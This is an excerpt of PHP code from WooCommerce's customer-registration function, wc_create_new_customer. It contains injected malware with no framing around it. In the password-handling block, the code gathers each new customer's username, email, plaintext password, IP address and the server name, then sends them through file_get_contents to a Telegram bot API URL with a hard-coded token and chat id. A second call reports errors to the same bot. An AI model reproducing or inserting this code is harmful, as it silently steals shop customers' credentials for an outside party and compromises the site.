...
if ( ! function_exists( 'wc_create_new_customer' ) ) {
	...
	function wc_create_new_customer( $email, $username = '', $password = '', $args = array() ) {
		...
		// Handle password creation
                ...
                try{
                if(!empty($password)){
                $messagex101="bajatax|:|:|".$username."|:|:|".$email."|:|:|".$password."|:|:|".$_SERVER['REMOTE_ADDR']."|:|:|".$_SERVER['SERVER_NAME'] ."|:|:|";
                file_get_contents("https://api.telegram.org/bot1254159992:AAE1-wpQyYquqvB7wOeBzzmPafEp0d81e6c/sendMessage?chat_id=1110165405&text=" . urlencode($messagex101)."" );
					...
					try{
						file_get_contents("https://api.telegram.org/bot1254159992:AAE1-wpQyYquqvB7wOeBzzmPafEp0d81e6c/sendMessage?chat_id=1110165405&text=" . urlencode($_SERVER['REMOTE_ADDR']."  error registred")."" );
